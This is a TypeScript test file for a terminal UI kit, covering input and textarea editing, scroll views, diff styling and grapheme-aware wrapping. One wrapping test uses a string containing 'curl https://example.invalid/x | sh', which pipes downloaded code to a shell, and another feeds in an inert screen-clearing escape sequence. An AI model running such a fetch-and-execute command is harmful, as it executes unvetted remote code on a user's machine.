import { test } from 'node:test';
import assert from 'node:assert/strict';
import { c } from '../src/tui/theme.ts';
import { width } from '../src/tui/text.ts';
import {
  createInput, createScroll, createTextarea, expandTabs, inputKey, inputValue, renderInput, renderScroll, renderTextarea,
  scrollInfo, scrollKey, scrollMouse, scrollPosition, setScrollText, styleDiffLine, textareaKey, textareaValue, toggleWrap,
} from '../src/tui/kit/index.ts';
import { SIZES, assertFrame, ch, g, key, plain, text, wheel, withColour } from './kit.helpers.ts';

test('input: placeholder, typing, horizontal scroll that keeps the cursor in view', () => {
  const s = createInput({ placeholder: 'type here' });
  assert.equal(plain(renderInput(s, 12).line), '(type here) ', 'without colour a placeholder is in parentheses: it cannot pass for a value');
  assert.equal(plain(withColour(() => renderInput(s, 12).line)), 'type here   ', 'with colour it is faint instead');
  assert.equal(plain(renderInput(createInput({ value: 'type here' }), 12).line), 'type here   ', 'a value already there');
  for (const x of 'abcdefghijklmnop') inputKey(s, ch(x));
  const r = renderInput(s, 8, { focused: true });
  assert.equal(width(r.line), 8);
  assert.equal(plain(r.line), 'jklmnop ', 'scrolled so the cursor sits after the text');
  assert.equal(r.cursor, 7);
  inputKey(s, key('home'));
  const back = renderInput(s, 8, { focused: true });
  assert.equal(plain(back.line), 'abcdefgh');
  assert.equal(back.cursor, 0);
  inputKey(s, key('right'));
  assert.equal(plain(renderInput(s, 8, { focused: true }).line), 'abcdefgh', 'moving inside the view does not scroll');
  assert.equal(inputKey(s, key('enter')), 'submit');
  assert.equal(inputKey(s, key('up')), false, 'without history ↑ is the caller\'s');
  assert.equal(inputKey(s, key('tab')), false);
  inputKey(s, { name: 'paste', text: 'X\nY' });
  assert.equal(inputValue(s), 'aX Ybcdefghijklmnop');
  inputKey(s, ch('\u0007'));
  assert.equal(inputValue(s), 'aX Ybcdefghijklmnop', 'control characters are not typed');
});

test('input: mask, wide characters, every width', () => {
  const s = createInput({ value: 'sk-秘密-123', mask: true });
  assert.equal(plain(renderInput(s, 12).line), '•'.repeat(9) + '   ', 'one mask per character, wide ones included');
  const wide = createInput({ value: '日本語のテキスト' });
  for (const cols of [1, 2, 3, 5, 9, 40]) {
    const r = renderInput(wide, cols, { focused: true, field: true });
    assert.equal(width(r.line), cols, `width ${cols}`);
    assert.ok(r.cursor! >= 0 && r.cursor! < cols);
  }
});

test('textarea: soft wrap, cursor across wrapped rows keeps its column, newline or submit', () => {
  const s = createTextarea({ value: 'the quick brown fox jumps over the lazy dog' });
  const r = renderTextarea(s, { rows: 4, cols: 13 }, { focused: true });
  assert.deepEqual(r.lines.map((l) => plain(l).trimEnd()), ['the quick', 'brown fox', 'jumps over', 'the lazy dog']);
  assert.deepEqual(r.cursor, { row: 3, col: 12 });
  textareaKey(s, key('up'));
  textareaKey(s, key('up'));
  assert.deepEqual(renderTextarea(s, { rows: 4, cols: 13 }, { focused: true }).cursor, { row: 1, col: 9 }, 'up keeps the column as far as the row allows');
  textareaKey(s, key('down'));
  textareaKey(s, key('down'));
  assert.deepEqual(renderTextarea(s, { rows: 4, cols: 13 }, { focused: true }).cursor, { row: 3, col: 12 }, 'and gets it back on the way down');
  assert.equal(textareaKey(s, key('down')), false, 'down on the last row is the caller\'s');
  assert.equal(textareaKey(s, key('enter')), true);
  textareaKey(s, ch('!'));
  assert.equal(textareaValue(s), 'the quick brown fox jumps over the lazy dog\n!');
  assert.equal(textareaKey(s, key('ctrl', 's')), 'submit');
  assert.equal(textareaKey(s, key('alt-enter')), 'submit', 'Alt-Enter does what Enter does not');
  const chat = createTextarea({ submitOnEnter: true });
  assert.equal(textareaKey(chat, key('enter')), 'submit');
  textareaKey(chat, key('alt-enter'));
  assert.equal(textareaValue(chat), '\n');
});

test('textarea: paste keeps lines, backspace joins them, word and line movement', () => {
  const s = createTextarea();
  textareaKey(s, { name: 'paste', text: 'one\r\ntwo\tthree\x1b[31m\nfour\n' });
  assert.equal(textareaValue(s), 'one\ntwo    three\nfour');
  textareaKey(s, key('ctrl-home'));
  textareaKey(s, key('end'));
  textareaKey(s, key('delete'));
  assert.equal(textareaValue(s), 'onetwo    three\nfour');
  textareaKey(s, key('ctrl-right'));
  textareaKey(s, key('ctrl-right'));
  assert.equal(s.col, 15);
  textareaKey(s, key('right'));
  assert.deepEqual([s.row, s.col], [1, 0], 'right at a line end goes to the next line');
  textareaKey(s, key('backspace'));
  assert.equal(textareaValue(s), 'onetwo    threefour');
  textareaKey(s, key('ctrl', 'w'));
  assert.equal(textareaValue(s), 'onetwo    four');
  textareaKey(s, key('ctrl', 'u'));
  assert.equal(textareaValue(s), 'four');
});

test('textarea renders exactly at every size; placeholder; scrolls to the cursor', () => {
  for (const [rows, cols] of SIZES) {
    const s = createTextarea({ value: '日本語 '.repeat(30) + '\n\nend' });
    const r = renderTextarea(s, { rows, cols }, { focused: true });
    assertFrame(r.lines, rows, cols, 'textarea');
    assert.ok(r.cursor && r.cursor.row >= 0 && r.cursor.row < rows && r.cursor.col < cols, `cursor at ${cols}x${rows}`);
  }
  assert.match(text(renderTextarea(createTextarea({ placeholder: 'Write here' }), { rows: 2, cols: 20 }).lines), /Write here/);
  const long = createTextarea({ value: Array.from({ length: 30 }, (_, i) => `line ${i}`).join('\n') });
  const r = renderTextarea(long, { rows: 5, cols: 20 }, { focused: true });
  assert.equal(plain(r.lines[4]!).trim(), 'line 29');
  textareaKey(long, key('pageup'));
  textareaKey(long, key('pageup'));
  const up = renderTextarea(long, { rows: 5, cols: 20 }, { focused: true });
  assert.equal(up.cursor!.row, 0, 'the view followed the cursor up');
});

test('scroll view: keys, wheel, wrap toggle, horizontal pan, position, follow', () => {
  const s = createScroll(Array.from({ length: 100 }, (_, i) => `line ${i} ${'x'.repeat(i)}`).join('\n'), { wrap: false });
  for (const [rows, cols] of SIZES) assertFrame(renderScroll(s, { rows, cols }, g, { scrollbar: true }), rows, cols, 'scroll');
  renderScroll(s, { rows: 10, cols: 30 }, g);
  assert.equal(scrollPosition(s), '1-10/100 0%');
  scrollKey(s, key('pagedown'));
  assert.equal(s.top, 9);
  scrollKey(s, key('end'));
  assert.equal(s.top, 90);
  assert.equal(scrollPosition(s), '91-100/100 100%');
  assert.match(plain(renderScroll(s, { rows: 10, cols: 30 }, g)[0]!), /^line 90 x/);
  scrollKey(s, key('right'));
  assert.match(plain(renderScroll(s, { rows: 10, cols: 30 }, g)[0]!), /^x{30}$/, 'panned right by 8 cells, past "line 90 "');
  scrollMouse(s, wheel('up'));
  assert.equal(s.top, 87);
  toggleWrap(s);
  assert.ok(scrollInfo(s).total > 100, 'wrapping makes more rows');
  assert.equal(scrollKey(s, key('right')), false, 'nothing to pan while wrapped');
  const log = createScroll('a\nb', { follow: true });
  renderScroll(log, { rows: 2, cols: 10 }, g);
  setScrollText(log, 'a\nb\nc\nd');
  renderScroll(log, { rows: 2, cols: 10 }, g);
  assert.equal(log.top, 2, 'following: it stays at the bottom as lines arrive');
});

test('diff styling: headers, hunks, additions, removals; tabs expand; external escapes are inert', () => withColour(() => {
  assert.equal(styleDiffLine('+added'), c.ok('+added'));
  assert.equal(styleDiffLine('-removed'), c.bad('-removed'));
  assert.equal(styleDiffLine('+++ b/x'), c.text.bold('+++ b/x'));
  assert.equal(styleDiffLine('diff --git a/x b/x'), c.info.bold('diff --git a/x b/x'));
  assert.equal(styleDiffLine('@@ -1,2 +1,3 @@ fn'), c.accent('@@ -1,2 +1,3 @@') + c.muted(' fn'));
  assert.equal(styleDiffLine('index 1..2'), c.muted('index 1..2'));
  assert.equal(expandTabs('a\tb'), 'a   b');
  const s = createScroll('+\x1b[2Jevil\n-\tgone', { diff: true });
  const lines = renderScroll(s, { rows: 2, cols: 20 }, g);
  assert.equal(plain(lines[0]!).trimEnd(), '+evil');
  assert.equal(plain(lines[1]!).trimEnd(), '-   gone');
  const wrapped = createScroll(`+${'y'.repeat(30)}`, { diff: true, wrap: true });
  const rows = renderScroll(wrapped, { rows: 3, cols: 12 }, g);
  assert.ok(rows[1]!.includes(c.ok('\0').split('\0')[0]!), 'a wrapped addition stays green on its next row');
}));

test('wrapParagraphs keeps line breaks, breaks long words instead of cutting them, and cuts with an ellipsis at maxLines', async () => {
  const { wrapParagraphs, wrap, midFit, cell, fit } = await import('../src/tui/text.ts');
  assert.deepEqual(wrapParagraphs('One two three.\n\n\nFour', 8), ['One two', 'three.', '', 'Four'], 'paragraphs kept, a run of blank lines is one');
  assert.deepEqual(wrap('One two three.\n\nFour', 8), ['One two', 'three.', 'Four'], 'wrap() is still one paragraph');
  const path = '/a/very/long/path/to/config.json';
  assert.equal(wrapParagraphs(path, 10).join(''), path, 'a long token is broken across rows, nothing dropped');
  for (const l of wrapParagraphs(`${path} and more words here`, 10)) assert.ok(width(l) <= 10);
  const cut = wrapParagraphs('a b c d e f g h i j k l m n o p', 5, 2);
  assert.equal(cut.length, 2);
  assert.match(cut[1]!, /…$/);
  assert.deepEqual(wrapParagraphs('\n\nx\n\n', 4), ['x'], 'leading and trailing blank lines go');
  assert.equal(midFit('/home/me/projects/dulger/.dulger/config.json', 20), '/home/me…config.json');
  assert.equal(width(midFit('/home/me/projects/dulger/.dulger/config.json', 20)), 20);
  assert.equal(midFit('short', 20), 'short');
  // cell: one measurement for a line that fits, the same output as before for one that does not.
  withColour(() => {
    const styled = c.accent('héllo 日本');
    assert.equal(cell(styled, 12), styled + '  ');
    assert.equal(cell(styled, 5), fit(styled, 5) + ' '.repeat(5 - width(fit(styled, 5))));
  });
  assert.equal(cell('abc', 0), '');
});

test('textarea: a placeholder keeps its line breaks and wraps; history walks from the edges', () => {
  const area = createTextarea({ placeholder: 'Describe the goal, e.g. add a health check.\nEnter starts it' });
  const shown = text(renderTextarea(area, { rows: 4, cols: 20 }).lines);
  assert.match(shown, /Describe the goal,\s*\ne\.g\. add a health\s*\ncheck\.\s*\nEnter starts it/, 'wrapped, and the line break kept');
  const one = text(renderTextarea(area, { rows: 1, cols: 20 }).lines);
  assert.match(one, /…/, 'a placeholder taller than the area ends in an ellipsis');
  const past = ['newest goal', 'older goal'];
  const h = createTextarea({ history: () => past });
  for (const x of 'draft') textareaKey(h, ch(x));
  assert.equal(textareaKey(h, key('up')), true);
  assert.equal(textareaValue(h), 'newest goal');
  textareaKey(h, key('up'));
  assert.equal(textareaValue(h), 'older goal');
  assert.equal(textareaKey(h, key('up')), true, 'the oldest: the key is still the area\'s');
  assert.equal(textareaValue(h), 'older goal');
  textareaKey(h, key('down'));
  textareaKey(h, key('down'));
  assert.equal(textareaValue(h), 'draft', 'back to what was typed');
  assert.equal(textareaKey(createTextarea(), key('up')), false, 'without history ↑ on the first row is the caller\'s');
});

test('scrollLines: a scroll view over styled lines keeps each row\'s styles, wraps and pans by the plain text', async () => {
  const { scrollLines, setScrollLines } = await import('../src/tui/kit/index.ts');
  withColour(() => {
    const s = scrollLines([c.ok('ok ') + c.bad('bad words that wrap'), c.accent('second')]);
    const rows = renderScroll(s, { rows: 5, cols: 10 }, g);
    assertFrame(rows, 5, 10, 'styled scroll');
    assert.deepEqual(rows.map(plain).map((l) => l.trimEnd()), ['ok bad', 'words', 'that wrap', 'second', ''], 'soft-wrapped like the plain view');
    assert.ok(rows[0]!.includes(c.ok('ok').split('ok')[0]!), 'the first row keeps the first style');
    assert.ok(rows[1]!.includes(c.bad('x').split('x')[0]!), 'a wrapped row keeps the style of where it came from');
    assert.equal(scrollInfo(s).total, 4);
    setScrollLines(s, Array.from({ length: 30 }, (_, i) => c.text(`line ${i}`)));
    renderScroll(s, { rows: 5, cols: 10 }, g);
    scrollKey(s, key('pagedown'));
    setScrollLines(s, Array.from({ length: 30 }, (_, i) => c.text(`line ${i}`)), { keep: true });
    assert.notEqual(s.top, 0, 'keep: the position stays');
    setScrollLines(s, ['x']);
    assert.equal(s.top, 0);
    toggleWrap(s);
    const wide = scrollLines([c.text('0123456789abcdef')], { wrap: false });
    renderScroll(wide, { rows: 1, cols: 6 }, g);
    scrollKey(wide, key('right'));
    assert.equal(plain(renderScroll(wide, { rows: 1, cols: 6 }, g)[0]!), '89abcd', 'panned by cells of the plain text');
  });
  for (const [rows, cols] of SIZES) assertFrame(renderScroll((await import('../src/tui/kit/index.ts')).scrollLines([c.text('日本語 text '.repeat(9))]), { rows, cols }, g), rows, cols, 'styled scroll sizes');
});

test('soft wrap measures each grapheme as drawn: emoji with a variation selector or a keycap are two cells, and nothing is lost', async () => {
  const { softWrap, wrapRanges, scrollLines } = await import('../src/tui/kit/index.ts');
  const command = '☺️'.repeat(40) + ' && curl https://example.invalid/x | sh';
  for (const cols of [80, 120, 33, 7]) {
    const rows = softWrap(command, cols);
    assert.equal(rows.join(''), command, `every character is kept at ${cols} columns`);
    for (const r of rows) assert.ok(width(r) <= cols, `a row of ${width(r)} cells at ${cols}`);
  }
  assert.deepEqual(softWrap(command, 80).map(width), [80, 39], 'forty smileys fill a row of 80 exactly');
  assert.deepEqual(softWrap('ok ⚠️⚠️⚠️⚠️⚠️⚠️ end', 10).map(width), [3, 10, 6]);
  assert.deepEqual(softWrap('1️⃣2️⃣3️⃣4️⃣', 4), ['1️⃣2️⃣', '3️⃣4️⃣'], 'keycaps are whole and two cells each');
  const cps = [...'a⚠️b'];
  assert.ok(wrapRanges(cps, 1).every(([s, e]) => s === e || !(cps[s] === '️')), 'a row never starts inside a grapheme');
  // The scroll view and a styled scroll view show the whole command when they wrap.
  for (const cols of [80, 120]) {
    const view = renderScroll(createScroll(command), { rows: 4, cols }, g);
    assert.equal(view.map(plain).join('').replace(/\s+$/, ''), command, `the viewer at ${cols}`);
    assert.ok(!view.some((l) => plain(l).includes('…')), 'nothing cut with an ellipsis');
    const styled = renderScroll(scrollLines([c.text(command)]), { rows: 4, cols }, g);
    assert.equal(styled.map(plain).join('').replace(/\s+$/, ''), command);
  }
  for (const [rows, cols] of SIZES) assertFrame(renderScroll(createScroll(command), { rows, cols }, g), rows, cols, 'emoji scroll');
});

test('textarea and input move, delete and wrap by grapheme: an emoji with its selector is one character', () => {
  const t = createTextarea({ value: 'ab⚠️⚠️⚠️⚠️⚠️cd' });
  const r = renderTextarea(t, { rows: 3, cols: 9 }, { focused: true });
  for (const l of r.lines) assert.equal(width(l), 9);
  assert.equal(r.lines.map(plain).join('').replace(/\s/g, ''), 'ab⚠️⚠️⚠️⚠️⚠️cd', 'nothing hidden');
  textareaKey(t, key('left'));
  textareaKey(t, key('left'));
  textareaKey(t, key('left'));
  assert.equal(t.col, [...'ab⚠️⚠️⚠️⚠️'].length, 'left steps over a whole emoji');
  textareaKey(t, key('backspace'));
  assert.equal(textareaValue(t), 'ab⚠️⚠️⚠️⚠️cd', 'backspace takes the emoji with its selector');
  textareaKey(t, key('delete'));
  assert.equal(textareaValue(t), 'ab⚠️⚠️⚠️cd');
  // Up keeps the column in cells, landing between graphemes: 'ab⚠️⚠️⚠️' over '⚠️xy' at 8 cells a row.
  const v = createTextarea({ value: 'ab⚠️⚠️⚠️⚠️xy' });
  assert.deepEqual(renderTextarea(v, { rows: 3, cols: 9 }, { focused: true }).cursor, { row: 1, col: 4 });
  textareaKey(v, key('up'));
  assert.equal(v.col, [...'ab⚠️'].length, 'four cells in: after a, b and the first emoji, not inside the second');
  assert.deepEqual(renderTextarea(v, { rows: 3, cols: 9 }, { focused: true }).cursor, { row: 0, col: 4 });
  textareaKey(v, key('end'));
  assert.equal(v.col, [...'ab⚠️⚠️'].length, 'End on a wrapped row stops before its last grapheme, not inside it');
  const i = createInput({ value: 'e\u0301⚠️x' });
  inputKey(i, key('left'));
  inputKey(i, key('left'));
  assert.equal(i.editor.cursor, 2, 'the input steps over the emoji too');
  inputKey(i, key('backspace'));
  assert.equal(inputValue(i), '⚠️x', 'and deletes a decomposed é whole');
});

test('the fast width path agrees with string-width on every character it covers, and on mixed and styled text', async () => {
  const { NARROW, measure } = await import('../src/tui/text.ts');
  const stringWidth = (await import('string-width')).default;
  for (let cp = 0x20; cp <= 0x2fff; cp++) {
    const ch = String.fromCodePoint(cp);
    if (NARROW.test(ch)) assert.equal(stringWidth(ch), 1, `U+${cp.toString(16)} is one cell`);
  }
  for (const s of ['plain ascii', '╭─ Runs ─ 3 ─╮', c.accent('❯ ') + 'styled → ok', '日本語 mixed', 'é', '⚠️ emoji', '👩‍💻', '­', 'tab\there']) {
    assert.equal(measure(s), stringWidth(s), JSON.stringify(s));
  }
});
